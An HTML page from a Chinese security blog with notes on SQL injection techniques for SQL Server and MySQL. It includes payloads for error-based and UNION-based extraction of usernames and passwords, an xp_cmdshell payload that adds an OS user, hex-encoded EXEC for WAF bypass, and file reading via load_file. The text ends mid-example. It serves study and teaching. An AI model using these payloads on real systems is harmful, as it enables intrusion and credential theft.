<!DOCTYPE html>
<html>
  <!-- meta/link... -->
  



<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <!-- Global site tag (gtag.js) - Google Analytics -->


  <title>SQL注入漏洞 | txjg blog</title>

  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
  
  
    <script>
        var themeModelId = '5';
        if (themeModelId) {
            localStorage.setItem('modelId', themeModelId);
        }
    </script>
    
    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
    <script>
        var live2dOpen = eval('true') || false;
        if (!live2dOpen) {
            localStorage.setItem('waifu-display', 1609323474481);
        }
    </script>
  
  
  
<link rel="stylesheet" href="/css/animate.min.css">

  
<link rel="stylesheet" href="/css/style.css">

  
  
    
<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">

  
  
  <style>
        @media (max-width: 992px) {
            #waifu {
                display: none;
            }
        }
    </style>
    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">

    

    <!-- import link -->
    
        
            
        
            
        
    
    <!-- import script -->
    
        
            
        
            
        
    

<meta name="generator" content="Hexo 6.3.0"></head>

  
  <!-- 依赖于jquery和vue -->
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>

  

  
    
<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>

  
  
  <body>
    <!-- 预加载动画 -->
    <!-- 页面预加载动画 -->

<div id='loader'>
  <link rel="stylesheet" href="/js/loaded/index.css" >
  <div class="loading-left-bg"></div>
  <div class="loading-right-bg"></div>
  <div class="spinner-box">
    <div class="configure-border-1">
      <div class="configure-core"></div>
    </div>
    <div class="configure-border-2">
      <div class="configure-core"></div>
    </div>
    <div class="loading-word">加载中...</div>
  </div>
</div>

<script>
  var endLoading = function () {
    document.body.style.overflow = 'auto';
    document.getElementById('loader').classList.add("loading");
  }
  window.addEventListener('DOMContentLoaded',endLoading);
  
</script>

    
    <!-- 判断是否为暗黑风格 -->
    <!-- 判断是否为黑夜模式 -->
<script>
  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');

  if (isDark) {
    $(document.body).addClass('darkModel');
  }
</script>

    <!-- 需要在上面加载的js -->
    <script>
  function loadScript(src, cb) {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }

  //https://github.com/filamentgroup/loadCSS
  var loadCSS = function (href, before, media, attributes) {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  };

</script> 

<!-- 轮播图所需要的js -->
<script src="/js/swiper/swiper.min.js"></script>
<script src="/js/swiper/vue-awesome-swiper.js"></script>
<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>

<script type="text/javascript">
  Vue.use(window.VueAwesomeSwiper)
</script>


  <script src="/js/vue-typed-js/index.js"></script>


<!-- 首页的公告滚动插件的js需要重新加载 -->
<script src="/js/vue-seamless-scroll/index.js"></script>

<!-- 打字机效果js -->
<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>


    <div id="safearea">
      <main class="main" id="pjax-container">
        <!-- 头部导航 -->
        
<header class="header   " 
  id="navHeader"
  style="position: fixed;
  left: 0; top: 0; z-index: 10;width: 100%;"
>
  <div class="header-content">
    <div class="bars">
      <div id="appDrawer" class="sidebar-image">
  <div class="drawer-box-icon">
    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
  </div>
  
  <transition name="fade">
    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
    </div>
  </transition>
  <div class="drawer-box" :class="{'active': visible}">
    <div class="drawer-box-head bg-color">
      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
      <h3 class="drawer-box-head_title">txjg blog</h3>
      <h5 class="drawer-box-head_desc"></h5>
    </div>
    
    <div class="drawer-box-content">
      <ul class="drawer-box-content_menu">
        
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/archives" class="drawer-menu-item-link">
                  
                    <i class="fas fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">归档</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/categories" class="drawer-menu-item-link">
                  
                    <i class="fas fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">分类</span>
                </a>
              
            </li>
          
        
        
      </ul>
    </div>
  </div>
</div>

<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appDrawer',
    data: {
      visible: false,
      top: 0,
      openArr: [],
    },
    computed: {
    },
    mounted() {
    },
    methods: {
      isOpen(index) {
        if (this.openArr.includes(index)) {
          return true;
        } else {
          return false;
        }
      },
      openOrCloseMenu(curIndex) {
        const index = this.openArr.indexOf(curIndex);
        if (index !== -1) {
          this.openArr.splice(index, 1);
        } else {
          this.openArr.push(curIndex);
        }
      },
      showDialogDrawer() {
        this.visible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
      },
      cancelDialogDrawer() {
        this.visible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      }
    },
    created() {}
  })
</script>

    </div>
    <div class="blog-title" id="author-avatar">
      
        <div class="avatar">
          <img src="/medias/logo.png" alt="logo">
        </div>
      
      <a href="/" class="logo">txjg blog</a>
    </div>
    <nav class="navbar">
      <ul class="menu">
        
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/archives" class="menu-item-link" title="归档">
                  
                    <i class="fas fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">归档</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/categories" class="menu-item-link" title="分类">
                  
                    <i class="fas fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">分类</span>
                </a>
              
            </li>
          
        
      </ul>
      
      
        <div id="appSearch">
  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
  <transition name="fade">
    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
      <div class="message-box animated bounceInDown">
        <h2>
          <span>
            <i class="fas fa-search" aria-hidden="true"></i>
            <span class="title">本地搜索</span>
          </span>
          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
        </h2>
        <form class="site-search-form">
          <input type="text"
            placeholder="请输入关键字"
            id="local-search-input" 
            @click="getSearchFile()"
            class="st-search-input"
            v-model="searchInput"
          />
        </form>
        <div class="result-wrapper">
          <div id="local-search-result" class="local-search-result-cls"></div>
        </div>
      </div>
    </div>
  </transition>
</div>
<script src="/js/local_search.js"></script>
<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appSearch',
    data: {
      dialogVisible: false,
      searchInput: '',
      top: 0,
    },
    computed: {
    },
    mounted() {
      window.addEventListener('pjax:complete', () => {
        this.cancelDialogVisible();
      })
    },
    methods: {
      showDialog() {
        this.dialogVisible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'overflow: hidden;';
      },
      getSearchFile() {
        if (!this.searchInput) {
          getSearchFile("/search.xml");
        }
      },
      cancelDialogVisible() {
        this.dialogVisible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      },
    },
    created() {}
  })
</script>
<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
<!-- 下面是搜索基本写法 -->
<!-- <script type="text/javascript" id="local.search.active">
  var inputArea = document.querySelector("#local-search-input");
  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
</script> -->

      

    </nav>
  </div>
  
  
</header>
        <!-- 内容区域 -->
        
 <!-- prismjs 代码高亮 -->
 
    
    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
    
        <link href="/js/prism/prism-twilight.min.css" rel="stylesheet">
    

    <style>
        pre[class*="language-"] {
            overflow-y: hidden;
        }
        .line-numbers .line-numbers-rows {
            border: none;
        }
    </style>
  


<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>


  <!-- 文章详情页顶部图片和标题 -->




<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
  background-position: center center;position: relative;background-image:url('/medias/12.jpg')">
  <div class="post-detail-header-mask"></div>
  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
  
  <div class="post-detail-header_info-box">
    <div class="title-box">
      <span class="title">
        SQL注入漏洞
      </span>
    </div>
    
    
      
        <span class="post-detail-header_date">
          <i class="fas fa-calendar"></i> 发表于：2021-12-15 |
        </span>
      

      
        <span class="post-detail-header_categories">
          <i class="iconfont iconbookmark1"></i> 分类：
          
            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
              web安全
            </a>
          
        </span>
      

      
    
  </div>
  
  
    <script src="/js/bubble/bubble.js"></script>
  
</div>





<div class="row justify-position" 
  style="padding-top: 0px;">
  <div class="main-content">
    <article class="post post-detail">
      <div class="post-content">
        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Sql连接符"><a href="#Sql连接符" class="headerlink" title="Sql连接符"></a>Sql连接符</h2><p>mysql为空格，<br>sql server为+，<br>oracle为||</p>
<h2 id="注入名词解释"><a href="#注入名词解释" class="headerlink" title="注入名词解释"></a>注入名词解释</h2><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>注入字段在post数据中</p>
<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>注入字段在cookie中</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>使用数据库延时特性注入</p>
<h3 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h3><p>注入处为搜索的地点</p>
<h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>注入字符串需要经过base64加密</p>
<h2 id="sql数据类型转换函数"><a href="#sql数据类型转换函数" class="headerlink" title="sql数据类型转换函数"></a>sql数据类型转换函数</h2><p>cast(),convert()<br>用法：cast(“aaa” as int) #把字符串aaa转换成int型<br>convert(11,char) #把数字11转换成字符串</p>
<h2 id="常见数据库注入"><a href="#常见数据库注入" class="headerlink" title="常见数据库注入"></a>常见数据库注入</h2><h3 id="SQL-server-（sql-server支持多语句执行）"><a href="#SQL-server-（sql-server支持多语句执行）" class="headerlink" title="SQL server （sql server支持多语句执行）"></a>SQL server （sql server支持多语句执行）</h3><h4 id="1-利用错误消息提取信息"><a href="#1-利用错误消息提取信息" class="headerlink" title="1.利用错误消息提取信息"></a>1.利用错误消息提取信息</h4><h5 id="使用having子句枚举当前表及列"><a href="#使用having子句枚举当前表及列" class="headerlink" title="使用having子句枚举当前表及列:"></a>使用having子句枚举当前表及列:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：在SQL server中，having子句必须跟随group by子句出现，否则会报错，会报出表名和第一个列名(假设为id)。 </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token keyword">table</span><span class="token punctuation">.</span>id <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：得到表名和第一个列名之后，我们可以利用sql server特性:<br>select了几个列就必须group by 相同的列，<br>由于我们只group by 了一 个id列，所以会报错，<br>报错信息会显示第二个列名，通过该方法，直到无报错，就可以依次获得该表所有的列名。 </p>
<h5 id="利用数据类型转换错误提取信息"><a href="#利用数据类型转换错误提取信息" class="headerlink" title="利用数据类型转换错误提取信息:"></a>利用数据类型转换错误提取信息:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：由于&gt;号的存在，sql server会把1和后面select语句的结果进行比较，<br>由于1是int型，select语句的结果是字符串(假设该结果是root),就会把root转换成int型再和1比较，<br>在转换过程中就会报错，select语句的结果就会爆出来(也就是root会爆出来)，然后我们就可以构造sql语句获取其他用户： </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> username <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者使用sql server内置数据类型转换函数：<br>convert(data_type,expression)<br>cast(expression as data_type)<br>如果递归获取信息比较麻烦,可以使用for xml path语句将查询的语句生成xml: </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token keyword">convert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">","</span><span class="token operator">+</span>username<span class="token punctuation">,</span><span class="token string">"|"</span><span class="token operator">+</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="2-获取元数据"><a href="#2-获取元数据" class="headerlink" title="2.获取元数据"></a>2.获取元数据</h4><h5 id="获得当前数据库："><a href="#获得当前数据库：" class="headerlink" title="获得当前数据库："></a>获得当前数据库：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="获得当前数据库表："><a href="#获得当前数据库表：" class="headerlink" title="获得当前数据库表："></a>获得当前数据库表：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'db_name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="获得当前数据库列："><a href="#获得当前数据库列：" class="headerlink" title="获得当前数据库列："></a>获得当前数据库列：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'table_name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>注：sql server常见表视图：<br>sys.databases #sql server中所有数据库<br>sys.sql_logins #sql server中所有登录名<br>information_schema.tables #当前用户数据库中的表<br>information_schema.columns #当前用户数据库中的列<br>sys.all_columns #用户定义对象和系统对象的所有列的联合<br>sys.database_principals #数据库中每个权限或列异常权限<br>sys.database_files #存储在数据库中的数据库文件<br>sysobjects #数据库中创建的每个对象(例如约束，日志，以及存储过程)</li>
</ul>
<h4 id="3-order-by子句"><a href="#3-order-by子句" class="headerlink" title="3.order by子句"></a>3.order by子句</h4><h5 id="使用order-by子句来获取表的查询列数："><a href="#使用order-by子句来获取表的查询列数：" class="headerlink" title="使用order by子句来获取表的查询列数："></a>使用order by子句来获取表的查询列数：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h4><h5 id="union查询探测列数："><a href="#union查询探测列数：" class="headerlink" title="union查询探测列数："></a>union查询探测列数：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="union查询敏感信息："><a href="#union查询敏感信息：" class="headerlink" title="union查询敏感信息："></a>union查询敏感信息：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'x'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把字符串x替换成sql语句即可查询信息<br>注： 1.union前后所有查询的列数必须相同 2.union前后所有查询的对应列的数据类型必须兼容</p>
<h4 id="5-无辜的函数"><a href="#5-无辜的函数" class="headerlink" title="5.无辜的函数"></a>5.无辜的函数</h4><p>select suser_name() #返回用户的登录标识名<br>select user_name() #基于指定的标识号返回数据库用户名<br>select db_name() #返回数据库名称<br>select is_member(‘db_owner’) #是否为数据库角色<br>select convert(int,’5’) #数据类型转换</p>
<h5 id="sql-server常用函数："><a href="#sql-server常用函数：" class="headerlink" title="sql server常用函数："></a>sql server常用函数：</h5><p>stuff #字符串截取函数<br>ascii #取ascii码<br>char #根据ascii码取字符<br>getdate #返回日期<br>count #返回组中的总条数<br>cast #将一种数据类型的表达式显式地转换为另一种数据类型的表达式<br>rand #返回随机值<br>is_srvrolemember #指示SQL server登录名是否为指定服务器角色的成员</p>
<h4 id="6-危险的存储过程"><a href="#6-危险的存储过程" class="headerlink" title="6.危险的存储过程"></a>6.危险的存储过程</h4><h5 id="存储过程-stored-procedure"><a href="#存储过程-stored-procedure" class="headerlink" title="存储过程(stored procedure):"></a>存储过程(stored procedure):</h5><p>是指在大型数据库系统中为了完成特定功能的一组 Sql“函数”，如：执行系统命令，查看注册表，读取磁盘目录等</p>
<h5 id="xp-cmdshell-允许用户执行操作系统命令"><a href="#xp-cmdshell-允许用户执行操作系统命令" class="headerlink" title="xp_cmdshell,允许用户执行操作系统命令:"></a>xp_cmdshell,允许用户执行操作系统命令:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'net user test test /add'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：并不是任何数据库用户都可以使用此类存储过程，用户必须持有 control server权限.</p>
<h5 id="常见的存储过程："><a href="#常见的存储过程：" class="headerlink" title="常见的存储过程："></a>常见的存储过程：</h5><p>sp_addlogin #创建新的SQL server登录，该登录允许用户使用sql server身份验证连接到SQL server实例<br>sp_dropuser #从当前数据库中删除数据库用户<br>xp_enumgroups #提供微软windows本地组列表或在指定的windows域中定义的全局组列表<br>xp_regwrite #写入注册表(未被公布的存储过程)<br>xp_regread #读取注册表<br>xp_regdeletevalue #删除注册表<br>xp_dirtree #读取目录<br>sp_password #更改密码<br>xp_servicecontrol #停止或激活某服务<br>注：任何数据库在使用一些特殊的函数或存储过程时，都需要有特定的权限，否则无法使用。</p>
<ul>
<li>Sql server数据库的角色与权限：<br>bulkadmin #角色成员可以运行bulk insert语句<br>dbcreator #角色成员可以创建，更改，删除和还原任何数据库<br>diskadmin #角色成员可以管理磁盘文件<br>processadmin #角色成员可以终止在数据库引擎实例中运行的进程<br>securityadmin #角色成员可以管理登录名及其属性。可以利用grant,deny,revoke服务器级别的权限；还可以利用grant,deny,revoke数据库级别的权限。此外，也可以重置SQL server登录名的密码。<br>serveradmin #角色成员可以更改服务器范围的配置选项和关闭服务器<br>setupadmin #角色成员可以添加和删除链接服务器，并可以执行某些系统存储过程。<br>sysadmin #角色成员可以在数据库引擎中执行任何活动。默认情况下，windows builtin\administrators组(本地管理员组)的所有成员都是sysadmin固定服务器角色的成员</li>
</ul>
<h4 id="7-动态执行"><a href="#7-动态执行" class="headerlink" title="7.动态执行"></a>7.动态执行</h4><h5 id="Sql-server支持动态执行语句："><a href="#Sql-server支持动态执行语句：" class="headerlink" title="Sql server支持动态执行语句："></a>Sql server支持动态执行语句：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用户提交一个字符串来执行<span class="token keyword">sql</span>语句：   
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'select username,password from users'</span><span class="token punctuation">)</span>或
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'selec'</span><span class="token operator">+</span><span class="token string">'t username,password fro'</span><span class="token operator">+</span><span class="token string">'m users'</span><span class="token punctuation">)</span>
定义<span class="token number">16</span>进制的<span class="token keyword">sql</span>语句，使<span class="token keyword">exec</span>函数执行：
<span class="token keyword">declare</span> <span class="token variable">@query</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">888</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token variable">@query</span><span class="token operator">=</span><span class="token number">0x364646373782</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span>
或者
<span class="token keyword">declare</span><span class="token comment">/**/</span><span class="token variable">@query</span><span class="token comment">/**/</span><span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">888</span><span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token variable">@query</span><span class="token operator">=</span><span class="token number">0x364747447</span><span class="token comment">/**/</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span>
注:大部分web应用防火墙<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>都过滤了单引号，使用<span class="token number">16</span>进制方式可以使<span class="token keyword">sql</span>语句不存在单引号，从而可以突破很多防火墙及防注入程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="MYSQL-（MYSQL不支持多语句执行）"><a href="#MYSQL-（MYSQL不支持多语句执行）" class="headerlink" title="MYSQL （MYSQL不支持多语句执行）"></a>MYSQL （MYSQL不支持多语句执行）</h3><h4 id="1-mysql中的注释"><a href="#1-mysql中的注释" class="headerlink" title="1.mysql中的注释"></a>1.mysql中的注释</h4><p>#	注释从“#”字符到行尾<br>--	注释从“--”序列到行尾。使用此注释时，后面需要跟上一个或多个空格.(注：空格、tag都可以）<br>&#x2F;**&#x2F;	注释从“&#x2F;*”序列到后面的“*&#x2F;”序列之间的字符<br>注：&#x2F;*!*&#x2F;不是注释,例：<br><code>select id/*!55555,username*/ from users</code><br>&#x2F;*!55555,username*&#x2F;的意思是:如果mysql版本号高于或等于5.55.55，则该语句就会执行。如果!后面不加入版本号，mysql将会直接执行sql语句。</p>
<h4 id="2-获取元数据-1"><a href="#2-获取元数据-1" class="headerlink" title="2.获取元数据:"></a>2.获取元数据:</h4><p>mysql 5.0及其以上版本提供了information_schema(信息数据库），提供了访问数据库元数据的方式。</p>
<h5 id="查询用户数据库名称"><a href="#查询用户数据库名称" class="headerlink" title="查询用户数据库名称:"></a>查询用户数据库名称:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="查询当前数据库表"><a href="#查询当前数据库表" class="headerlink" title="查询当前数据库表:"></a>查询当前数据库表:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="查询指定表的所有字段"><a href="#查询指定表的所有字段" class="headerlink" title="查询指定表的所有字段:"></a>查询指定表的所有字段:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="3-union查询"><a href="#3-union查询" class="headerlink" title="3.union查询:"></a>3.union查询:</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="4-mysql函数利用"><a href="#4-mysql函数利用" class="headerlink" title="4.mysql函数利用:"></a>4.mysql函数利用:</h4><h5 id="load-file-读文件操作"><a href="#load-file-读文件操作" class="headerlink" title="load_file() #读文件操作"></a>load_file() #读文件操作</h5><p>注：要读取文件的位置必须在服务器上，文件必须为绝对路径，而且用户必须持有FILE权限，文件容量必须小于max_allowed_packet字节（默认为16M，最大为1G）<br>例：</p>
